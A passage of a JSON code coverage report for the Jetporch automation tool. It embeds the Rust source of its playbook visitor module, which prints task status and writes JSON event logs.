ine":138,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":195,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":207,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":211,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":215,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":222,"address":[],"length":0,"stats":{"Line":0}},{"line":228,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":231,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":236,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":243,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":249,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":258,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":267,"address":[],"length":0,"stats":{"Line":0}},{"line":270,"address":[],"length":0,"stats":{"Line":0}},{"line":271,"address":[],"length":0,"stats":{"Line":0}},{"line":272,"address":[],"length":0,"stats":{"Line":0}},{"line":273,"address":[],"length":0,"stats":{"Line":0}},{"line":274,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":278,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":287,"address":[],"length":0,"stats":{"Line":0}},{"line":290,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":294,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":296,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[],"length":0,"stats":{"Line":0}},{"line":300,"address":[],"length":0,"stats":{"Line":0}},{"line":305,"address":[],"length":0,"stats":{"Line":0}},{"line":306,"address":[],"length":0,"stats":{"Line":0}},{"line":307,"address":[],"length":0,"stats":{"Line":0}},{"line":312,"address":[],"length":0,"stats":{"Line":0}},{"line":316,"address":[],"length":0,"stats":{"Line":0}},{"line":317,"address":[],"length":0,"stats":{"Line":0}},{"line":318,"address":[],"length":0,"stats":{"Line":0}},{"line":319,"address":[],"length":0,"stats":{"Line":0}},{"line":324,"address":[],"length":0,"stats":{"Line":0}},{"line":328,"address":[],"length":0,"stats":{"Line":0}},{"line":330,"address":[],"length":0,"stats":{"Line":0}},{"line":333,"address":[],"length":0,"stats":{"Line":0}},{"line":334,"address":[],"length":0,"stats":{"Line":0}},{"line":335,"address":[],"length":0,"stats":{"Line":0}},{"line":336,"address":[],"length":0,"stats":{"Line":0}},{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":339,"address":[],"length":0,"stats":{"Line":0}},{"line":340,"address":[],"length":0,"stats":{"Line":0}},{"line":346,"address":[],"length":0,"stats":{"Line":0}},{"line":347,"address":[],"length":0,"stats":{"Line":0}},{"line":348,"address":[],"length":0,"stats":{"Line":0}},{"line":349,"address":[],"length":0,"stats":{"Line":0}},{"line":350,"address":[],"length":0,"stats":{"Line":0}},{"line":352,"address":[],"length":0,"stats":{"Line":0}},{"line":353,"address":[],"length":0,"stats":{"Line":0}},{"line":358,"address":[],"length":0,"stats":{"Line":0}},{"line":364,"address":[],"length":0,"stats":{"Line":0}},{"line":365,"address":[],"length":0,"stats":{"Line":0}},{"line":370,"address":[],"length":0,"stats":{"Line":0}},{"line":371,"address":[],"length":0,"stats":{"Line":0}},{"line":375,"address":[],"length":0,"stats":{"Line":0}},{"line":382,"address":[],"length":0,"stats":{"Line":0}},{"line":383,"address":[],"length":0,"stats":{"Line":0}},{"line":384,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":386,"address":[],"length":0,"stats":{"Line":0}},{"line":392,"address":[],"length":0,"stats":{"Line":0}},{"line":393,"address":[],"length":0,"stats":{"Line":0}},{"line":394,"address":[],"length":0,"stats":{"Line":0}},{"line":396,"address":[],"length":0,"stats":{"Line":0}},{"line":397,"address":[],"length":0,"stats":{"Line":0}},{"line":398,"address":[],"length":0,"stats":{"Line":0}},{"line":399,"address":[],"length":0,"stats":{"Line":0}},{"line":405,"address":[],"length":0,"stats":{"Line":0}},{"line":406,"address":[],"length":0,"stats":{"Line":0}},{"line":410,"address":[],"length":0,"stats":{"Line":0}},{"line":411,"address":[],"length":0,"stats":{"Line":0}},{"line":412,"address":[],"length":0,"stats":{"Line":0}},{"line":413,"address":[],"length":0,"stats":{"Line":0}},{"line":414,"address":[],"length":0,"stats":{"Line":0}},{"line":415,"address":[],"length":0,"stats":{"Line":0}},{"line":416,"address":[],"length":0,"stats":{"Line":0}},{"line":418,"address":[],"length":0,"stats":{"Line":0}},{"line":421,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":428,"address":[],"length":0,"stats":{"Line":0}},{"line":434,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":437,"address":[],"length":0,"stats":{"Line":0}},{"line":438,"address":[],"length":0,"stats":{"Line":0}},{"line":439,"address":[],"length":0,"stats":{"Line":0}},{"line":441,"address":[],"length":0,"stats":{"Line":0}},{"line":442,"address":[],"length":0,"stats":{"Line":0}},{"line":443,"address":[],"length":0,"stats":{"Line":0}},{"line":446,"address":[],"length":0,"stats":{"Line":0}},{"line":450,"address":[],"length":0,"stats":{"Line":0}},{"line":451,"address":[],"length":0,"stats":{"Line":0}},{"line":453,"address":[],"length":0,"stats":{"Line":0}},{"line":458,"address":[],"length":0,"stats":{"Line":0}},{"line":459,"address":[],"length":0,"stats":{"Line":0}},{"line":462,"address":[],"length":0,"stats":{"Line":0}},{"line":463,"address":[],"length":0,"stats":{"Line":0}},{"line":464,"address":[],"length":0,"stats":{"Line":0}},{"line":465,"address":[],"length":0,"stats":{"Line":0}},{"line":466,"address":[],"length":0,"stats":{"Line":0}},{"line":467,"address":[],"length":0,"stats":{"Line":0}},{"line":470,"address":[],"length":0,"stats":{"Line":0}},{"line":471,"address":[],"length":0,"stats":{"Line":0}},{"line":474,"address":[],"length":0,"stats":{"Line":0}},{"line":475,"address":[],"length":0,"stats":{"Line":0}},{"line":481,"address":[],"length":0,"stats":{"Line":0}},{"line":484,"address":[],"length":0,"stats":{"Line":0}},{"line":488,"address":[],"length":0,"stats":{"Line":0}},{"line":489,"address":[],"length":0,"stats":{"Line":0}},{"line":490,"address":[],"length":0,"stats":{"Line":0}},{"line":491,"address":[],"length":0,"stats":{"Line":0}},{"line":492,"address":[],"length":0,"stats":{"Line":0}},{"line":495,"address":[],"length":0,"stats":{"Line":0}},{"line":498,"address":[],"length":0,"stats":{"Line":0}},{"line":502,"address":[],"length":0,"stats":{"Line":0}},{"line":503,"address":[],"length":0,"stats":{"Line":0}},{"line":504,"address":[],"length":0,"stats":{"Line":0}},{"line":505,"address":[],"length":0,"stats":{"Line":0}},{"line":506,"address":[],"length":0,"stats":{"Line":0}},{"line":509,"address":[],"length":0,"stats":{"Line":0}},{"line":512,"address":[],"length":0,"stats":{"Line":0}},{"line":516,"address":[],"length":0,"stats":{"Line":0}},{"line":517,"address":[],"length":0,"stats":{"Line":0}},{"line":518,"address":[],"length":0,"stats":{"Line":0}},{"line":519,"address":[],"length":0,"stats":{"Line":0}},{"line":520,"address":[],"length":0,"stats":{"Line":0}},{"line":523,"address":[],"length":0,"stats":{"Line":0}},{"line":526,"address":[],"length":0,"stats":{"Line":0}},{"line":531,"address":[],"length":0,"stats":{"Line":0}},{"line":532,"address":[],"length":0,"stats":{"Line":0}},{"line":534,"address":[],"length":0,"stats":{"Line":0}},{"line":537,"address":[],"length":0,"stats":{"Line":0}},{"line":544,"address":[],"length":0,"stats":{"Line":0}},{"line":545,"address":[],"length":0,"stats":{"Line":0}},{"line":546,"address":[],"length":0,"stats":{"Line":0}},{"line":548,"address":[],"length":0,"stats":{"Line":0}},{"line":550,"address":[],"length":0,"stats":{"Line":0}},{"line":551,"address":[],"length":0,"stats":{"Line":0}},{"line":554,"address":[],"length":0,"stats":{"Line":0}},{"line":556,"address":[],"length":0,"stats":{"Line":0}},{"line":557,"address":[],"length":0,"stats":{"Line":0}},{"line":558,"address":[],"length":0,"stats":{"Line":0}},{"line":559,"address":[],"length":0,"stats":{"Line":0}},{"line":560,"address":[],"length":0,"stats":{"Line":0}},{"line":561,"address":[],"length":0,"stats":{"Line":0}},{"line":562,"address":[],"length":0,"stats":{"Line":0}},{"line":563,"address":[],"length":0,"stats":{"Line":0}},{"line":565,"address":[],"length":0,"stats":{"Line":0}},{"line":569,"address":[],"length":0,"stats":{"Line":0}},{"line":571,"address":[],"length":0,"stats":{"Line":0}},{"line":572,"address":[],"length":0,"stats":{"Line":0}},{"line":576,"address":[],"length":0,"stats":{"Line":0}},{"line":577,"address":[],"length":0,"stats":{"Line":0}},{"line":578,"address":[],"length":0,"stats":{"Line":0}},{"line":580,"address":[],"length":0,"stats":{"Line":0}},{"line":581,"address":[],"length":0,"stats":{"Line":0}},{"line":582,"address":[],"length":0,"stats":{"Line":0}},{"line":585,"address":[],"length":0,"stats":{"Line":0}},{"line":588,"address":[],"length":0,"stats":{"Line":0}},{"line":592,"address":[],"length":0,"stats":{"Line":0}},{"line":594,"address":[],"length":0,"stats":{"Line":0}},{"line":595,"address":[],"length":0,"stats":{"Line":0}},{"line":596,"address":[],"length":0,"stats":{"Line":0}},{"line":597,"address":[],"length":0,"stats":{"Line":0}},{"line":602,"address":[],"length":0,"stats":{"Line":0}},{"line":603,"address":[],"length":0,"stats":{"Line":0}},{"line":604,"address":[],"length":0,"stats":{"Line":0}},{"line":608,"address":[],"length":0,"stats":{"Line":0}},{"line":609,"address":[],"length":0,"stats":{"Line":0}},{"line":610,"address":[],"length":0,"stats":{"Line":0}},{"line":611,"address":[],"length":0,"stats":{"Line":0}},{"line":613,"address":[],"length":0,"stats":{"Line":0}},{"line":615,"address":[],"length":0,"stats":{"Line":0}},{"line":618,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":263},{"path":["/","Users","wings","projects","jetpack","src","playbooks","visitor.rs"],"content":"\n// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::playbooks::context::PlaybookContext;\nuse std::sync::Arc;\nuse crate::tasks::*;\nuse std::sync::RwLock;\nuse crate::inventory::hosts::Host;\nuse inline_colorization::{color_red,color_blue,color_green,color_cyan,color_reset,color_yellow};\nuse crate::connection::command::CommandResult;\nuse crate::playbooks::traversal::HandlerMode;\nuse std::fs::OpenOptions;\nuse std::io::prelude::*;\nuse std::fs::File;\nuse serde_json::json;\nuse guid_create::GUID;\nuse chrono::prelude::*;\nuse std::env;\n\n// visitor contains various functions that are called from all over the program\n// to send feedback to the user and logs\n\n#[derive(PartialEq)]\npub enum CheckMode {\n    Yes,\n    No\n}\n\npub struct PlaybookVisitor {\n    pub check_mode: CheckMode,\n    pub logfile: Option\u003cArc\u003cRwLock\u003cFile\u003e\u003e\u003e,\n    pub run_id: String,\n    pub utc_start: DateTime\u003cUtc\u003e\n}\n\npub struct LogData {\n    pub event: String,\n    pub play: Option\u003cString\u003e,\n    pub playbook_path: Option\u003cString\u003e,\n    pub role: Option\u003cString\u003e,\n    pub task: Option\u003cString\u003e,\n    pub task_ct: Option\u003cusize\u003e,\n    pub cmd: Option\u003cString\u003e,\n    pub cmd_rc: Option\u003ci32\u003e,\n    pub cmd_out: Option\u003cString\u003e,\n    pub task_status: Option\u003cString\u003e,\n    pub host: Option\u003cString\u003e,\n    pub summary: Option\u003cserde_json::map::Map\u003cString,serde_json::Value\u003e\u003e\n}\n\nimpl PlaybookVisitor {\n\n    pub fn new(check_mode: CheckMode) -\u003e Self {\n\n        let logpath : String = match env::var(\"JET_LOG\") {\n            Ok(x) =\u003e {\n                x\n            },\n            Err(_) =\u003e String::from(\"/var/log/jetp/jetp.log\")\n        };\n\n        // TODO: make logfile location configurable by environment variable\n        let logfile : Option\u003cArc\u003cRwLock\u003cFile\u003e\u003e\u003e = match OpenOptions::new().write(true).create(true).append(true).open(logpath) {\n            Ok(x) =\u003e Some(Arc::new(RwLock::new(x))),\n            Err(_) =\u003e None\n        };\n\n        let s = Self {\n            check_mode: check_mode,\n            logfile: logfile,\n            utc_start: Utc::now(),\n            run_id: GUID::rand().to_string()\n        };\n        s\n    }\n\n    pub fn log_entry(\u0026self, event: \u0026String, context: Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) -\u003e LogData {\n        let ctx = context.read().unwrap();\n        LogData {\n            event: event.clone(),\n            play: ctx.play.clone(),\n            playbook_path: ctx.playbook_path.clone(),\n            role: match \u0026ctx.role {\n                Some(x) =\u003e Some(x.name.clone()),\n                None =\u003e None\n            },\n            task: match \u0026ctx.task {\n                Some(x) =\u003e Some(x.clone()),\n                None =\u003e None\n            },\n            task_ct: match \u0026ctx.task {\n                Some(_) =\u003e Some(ctx.task_count),\n                None =\u003e None\n            },\n            cmd: None,\n            cmd_rc: None,\n            cmd_out: None,\n            task_status: None,\n            host: None,\n            summary: None\n        }\n    }\n\n    pub fn log(\u0026self, log: \u0026LogData) {\n\n        if self.logfile.is_none() {\n            return;\n        }\n\n        let now = Utc::now();\n\n        let mut obj =  serde_json::map::Map::new();\n        obj.insert(String::from(\"event\"), json!(log.event.clone()));\n        obj.insert(String::from(\"run\"), json!(self.run_id));\n        obj.insert(String::from(\"now\"), json!(now.to_rfc2822()));\n        obj.insert(String::from(\"start\"), json!(self.utc_start.to_rfc2822()));\n        let elapsed = now - self.utc_start;\n        obj.insert(String::from(\"elapsed\"),     json!(elapsed.num_seconds()));\n\n        if log.play.is_some()        { obj.insert(String::from(\"playbook\"),    json!(log.playbook_path.clone().unwrap())); }\n        if log.play.is_some()        { obj.insert(String::from(\"play\"),        json!(log.play.clone().unwrap()));          }\n        if log.role.is_some()        { obj.insert(String::from(\"role\"),        json!(log.role.clone().unwrap()));          }\n        if log.task.is_some()        { obj.insert(String::from(\"task\"),        json!(log.task.clone().unwrap()));          }\n        if log.task.is_some()        { obj.insert(String::from(\"task_ct\"),     json!(log.task_ct.clone().unwrap()));       }\n        if log.cmd.is_some()         { obj.insert(String::from(\"cmd\"),         json!(log.cmd.clone().unwrap()));           }\n        if log.cmd_rc.is_some()      { obj.insert(String::from(\"cmd_rc\"),      json!(log.cmd_rc.clone().unwrap()));        }\n        if log.cmd_out.is_some()     { obj.insert(String::from(\"cmd_out\"),     json!(log.cmd_out.clone().unwrap()));       }\n        if log.task_status.is_some() { obj.insert(String::from(\"task_status\"), json!(log.task_status.clone().unwrap()));   }\n        if log.host.is_some()        { obj.insert(String::from(\"host\"),        json!(log.host.clone().unwrap()));          }\n        \n        if log.summary.is_some()     { obj.insert(String::from(\"summary\"),     json!(log.summary.clone().unwrap()));       }\n\n\n   \n        match serde_json::to_string(\u0026obj) {\n            Ok(json_str) =\u003e {\n                let mut f = self.logfile.as_ref().unwrap().write().unwrap();\n                match writeln!(f, \"{}\",  json_str) {\n                    Ok(_) =\u003e {},\n                    Err(_e) =\u003e { }\n                }\n            },\n            Err(_y) =\u003e {}\n        }\n\n    }\n\n    pub fn is_check_mode(\u0026self) -\u003e bool { \n        return self.check_mode == CheckMode::Yes; \n    }\n\n    pub fn banner(\u0026self) {\n        println!(\"----------------------------------------------------------\");\n    }\n\n    // used by the echo module\n    pub fn debug_host(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, message: \u0026String) {\n        println!(\"{color_cyan}  ..... {} : {}{color_reset}\", host.read().unwrap().name, message);\n    }\n\n    pub fn on_playbook_start(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) {\n        let ctx = context.read().unwrap();\n        let path = ctx.playbook_path.as_ref().unwrap();\n        self.banner();\n        println!(\"\u003e playbook start: {}\", path);\n\n        let log_entry = self.log_entry(\u0026String::from(\"PLAYBOOK_START\"), context.clone());\n        self.log(\u0026log_entry);\n    }\n\n    pub fn on_play_start(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) {\n        let play = \u0026context.read().unwrap().play;\n        self.banner();\n        println!(\"\u003e play: {}\", play.as_ref().unwrap());\n\n        let log_entry = self.log_entry(\u0026String::from(\"PLAY_START\"), context.clone());\n        self.log(\u0026log_entry);\n\n    }\n\n    pub fn on_role_start(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) {\n        let log_entry = self.log_entry(\u0026String::from(\"ROLE_START\"), context.clone());\n        self.log(\u0026log_entry);\n    }\n\n    pub fn on_role_stop(\u0026self, _context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) {\n    }\n\n    pub fn on_play_stop(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, failed: bool) {\n        // failed occurs if *ALL* hosts in a play have failed\n        let ctx = context.read().unwrap();\n        let play_name = ctx.get_play_name();\n        if ! failed {\n            self.banner();\n            println!(\"\u003e play complete: {}\", play_name);\n        } else {\n            self.banner();\n            println!(\"{color_red}\u003e play failed: {}{color_reset}\", play_name);\n\n        }\n    }\n\n    pub fn on_exit(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) {\n        println!(\"----------------------------------------------------------\");\n        println!(\"\");\n        self.show_playbook_summary(context);\n    }\n\n    pub fn on_task_start(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, is_handler: HandlerMode) {\n        let context2 = context.read().unwrap();\n        let task = context2.task.as_ref().unwrap();\n        let role = \u0026context2.role;\n\n        let what = match is_handler {\n            HandlerMode::NormalTasks =\u003e String::from(\"task\"),\n            HandlerMode::Handlers    =\u003e String::from(\"handler\")\n        };\n\n        self.banner();\n        if role.is_none() {\n            println!(\"\u003e begin {}: {}\", what, task);\n        }\n        else {\n            println!(\"\u003e ({}) begin {}: {}\", role.as_ref().unwrap().name, what, task);\n        }\n\n        let log_entry = self.log_entry(\u0026String::from(\"TASK_START\"), Arc::clone(context));\n        self.log(\u0026log_entry);\n    }\n\n    pub fn on_batch(\u0026self, batch_num: usize, batch_count: usize, batch_size: usize) {\n        self.banner();\n        println!(\"\u003e batch {}/{}, {} hosts\", batch_num+1, batch_count, batch_size);\n    }\n\n    pub fn on_host_task_start(\u0026self, _context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        let host2 = host.read().unwrap();\n        println!(\"… {} =\u003e running\", host2.name);\n    }\n\n    pub fn on_notify_handler(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, which_handler: \u0026String) {\n        let host2 = host.read().unwrap();\n        println!(\"… {} =\u003e notified: {}\", host2.name, which_handler);\n    }\n\n    pub fn on_host_delegate(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, delegated: \u0026String) {\n        let host2 = host.read().unwrap();\n        println!(\"{color_blue}✓ {} =\u003e delegating to: {}{color_reset}\",  \u0026host2.name, delegated.clone());\n    }\n\n    pub fn on_host_task_ok(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, task_response: \u0026Arc\u003cTaskResponse\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        let host2 = host.read().unwrap();\n        {\n            let mut context2 = context.write().unwrap();\n            context2.increment_attempted_for_host(\u0026host2.name);\n            match \u0026task_response.status {\n                TaskStatus::IsCreated  =\u003e  {\n                    println!(\"{color_blue}✓ {} =\u003e created{color_reset}\",  \u0026host2.name);\n                    context2.increment_created_for_host(\u0026host2.name);\n                },\n                TaskStatus::IsRemoved  =\u003e  {\n                    println!(\"{color_blue}✓ {} =\u003e removed{color_reset}\",  \u0026host2.name);\n                    context2.increment_removed_for_host(\u0026host2.name);\n                },\n                TaskStatus::IsModified =\u003e  {\n                    let changes2 : Vec\u003cString\u003e = task_response.changes.iter().map(|x| { format!(\"{:?}\", x) }).collect();\n                    let change_str = changes2.join(\",\");\n                    println!(\"{color_blue}✓ {} =\u003e modified ({}){color_reset}\", \u0026host2.name, change_str);\n                    context2.increment_modified_for_host(\u0026host2.name);\n                },\n                TaskStatus::IsExecuted =\u003e  {\n                    println!(\"{color_blue}✓ {} =\u003e complete{color_reset}\", \u0026host2.name);\n                    context2.increment_executed_for_host(\u0026host2.name);\n                },\n                TaskStatus::IsPassive  =\u003e  {\n                    // println!(\"{color_green}! host: {} =\u003e ok (no effect) {color_reset}\", \u0026host2.name);\n                    context2.increment_passive_for_host(\u0026host2.name);\n                }\n                TaskStatus::IsMatched  =\u003e  {\n                    println!(\"{color_green}✓ {} =\u003e matched {color_reset}\", \u0026host2.name);\n                    context2.increment_matched_for_host(\u0026host2.name);\n                }\n                TaskStatus::IsSkipped  =\u003e  {\n                    println!(\"{color_yellow}✓ {} =\u003e skipped {color_reset}\", \u0026host2.name);\n                    context2.increment_skipped_for_host(\u0026host2.name);\n                }\n                TaskStatus::Failed =\u003e {\n                    println!(\"{color_yellow}✓ {} =\u003e failed (ignored){color_reset}\", \u0026host2.name);\n                }\n                _ =\u003e {\n                    panic!(\"on host {}, invalid final task return status, FSM should have rejected: {:?}\", host2.name, task_response); \n                }\n            }\n        }\n\n        let mut log_entry = self.log_entry(\u0026String::from(\"TASK_STATUS\"), Arc::clone(context));\n        log_entry.host = Some(host2.name.clone());\n        log_entry.task_status = Some(format!(\"{:?}\", \u0026task_response.status));\n        self.log(\u0026log_entry);\n\n    }\n\n    // the check mode version of on_host_task_ok - different possible states, slightly different output\n\n    pub fn on_host_task_check_ok(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, task_response: \u0026Arc\u003cTaskResponse\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        let host2 = host.read().unwrap();\n        {\n            let mut context2 = context.write().unwrap();\n            context2.increment_attempted_for_host(\u0026host2.name);\n            match \u0026task_response.status {\n                TaskStatus::NeedsCreation  =\u003e  {\n                    println!(\"{color_blue}✓ {} =\u003e would create{color_reset}\",  \u0026host2.name);\n                    context2.increment_created_for_host(\u0026host2.name);\n                },\n                TaskStatus::NeedsRemoval  =\u003e  {\n                    println!(\"{color_blue}✓ {} =\u003e would remove{color_reset}\",  \u0026host2.name);\n                    context2.increment_removed_for_host(\u0026host2.name);\n                },\n                TaskStatus::NeedsModification =\u003e  {\n                    let changes2 : Vec\u003cString\u003e = task_response.changes.iter().map(|x| { format!(\"{:?}\", x) }).collect();\n                    let change_str = changes2.join(\",\");\n                    println!(\"{color_blue}✓ {} =\u003e would modify ({}) {color_reset}\", \u0026host2.name, change_str);\n                    context2.increment_modified_for_host(\u0026host2.name);\n                },\n                TaskStatus::NeedsExecution =\u003e  {\n                    println!(\"{color_blue}✓ {} =\u003e would run{color_reset}\", \u0026host2.name);\n                    context2.increment_executed_for_host(\u0026host2.name);\n                },\n                TaskStatus::IsPassive  =\u003e  {\n                    context2.increment_passive_for_host(\u0026host2.name);\n                }\n                TaskStatus::IsMatched  =\u003e  {\n                    println!(\"{color_green}✓ {} =\u003e matched {color_reset}\", \u0026host2.name);\n                    context2.increment_matched_for_host(\u0026host2.name);\n                }\n                TaskStatus::IsSkipped  =\u003e  {\n                    println!(\"{color_yellow}✓ {} =\u003e skipped {color_reset}\", \u0026host2.name);\n                    context2.increment_skipped_for_host(\u0026host2.name);\n                }\n                TaskStatus::Failed =\u003e {\n                    println!(\"{color_yellow}✓ {} =\u003e failed (ignored){color_reset}\", \u0026host2.name);\n                }\n                _ =\u003e {\n                    panic!(\"on host {}, invalid check-mode final task return status, FSM should have rejected: {:?}\", host2.name, task_response); \n                }\n            }\n        }\n\n        let mut log_entry = self.log_entry(\u0026String::from(\"TASK_CHECK_STATUS\"), Arc::clone(context));\n        log_entry.host = Some(host2.name.clone());\n        log_entry.task_status = Some(format!(\"{:?}\", \u0026task_response.status));\n        self.log(\u0026log_entry);\n    }\n\n    pub fn on_host_task_retry(\u0026self, _context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e,host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, retries: u64, delay: u64) {\n        let host2 = host.read().unwrap();\n        println!(\"{color_blue}! {} =\u003e retrying ({} retries left) in {} seconds{color_reset}\",host2.name,retries,delay);\n    }\n\n    pub fn on_host_task_failed(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, task_response: \u0026Arc\u003cTaskResponse\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        let mut log_entry = self.log_entry(\u0026String::from(\"TASK_FAILED\"), Arc::clone(context));\n        let host2 = host.read().unwrap();\n        if task_response.msg.is_some() {\n            let msg = \u0026task_response.msg;\n            if task_response.command_result.is_some() {\n                {\n                    let cmd_result = task_response.command_result.as_ref().as_ref().unwrap();\n                    let _lock = context.write().unwrap();\n                    println!(\"{color_red}! {} =\u003e failed\", host2.name);\n                    println!(\"    cmd: {}\", cmd_result.cmd);\n                    println!(\"    out: {}\", cmd_result.out);\n                    println!(\"    rc: {}{color_reset}\", cmd_result.rc);\n                    log_entry.cmd     = Some(cmd_result.cmd.clone());\n                    log_entry.cmd_out = Some(cmd_result.out.clone());\n                    log_entry.cmd_rc  = Some(cmd_result.rc.clone());\n                }\n            } else {\n                println!(\"{color_red}! error: {}: {}{color_reset}\", host2.name, msg.as_ref().unwrap());\n            }\n        } else {\n            println!(\"{color_red}! host failed: {}, {color_reset}\", host2.name);\n        }\n\n        context.write().unwrap().increment_failed_for_host(\u0026host2.name);\n        log_entry.host = Some(host2.name.clone());\n        log_entry.task_status = Some(format!(\"{:?}\", \u0026task_response.status));\n        self.log(\u0026log_entry);\n    }\n\n    pub fn on_host_connect_failed(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        let host2 = host.read().unwrap();\n        context.write().unwrap().increment_failed_for_host(\u0026host2.name);\n        println!(\"{color_red}! connection failed to host: {}{color_reset}\", host2.name);\n        let mut log_entry = self.log_entry(\u0026String::from(\"HOST_CONNECT_FAILED\"), Arc::clone(context));\n        log_entry.host = Some(host2.name.clone());\n        self.log(\u0026log_entry);\n    }\n\n    pub fn get_exit_status(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) -\u003e i32 {\n        let failed_hosts = context.read().unwrap().get_hosts_failed_count();\n        return match failed_hosts {\n            0 =\u003e 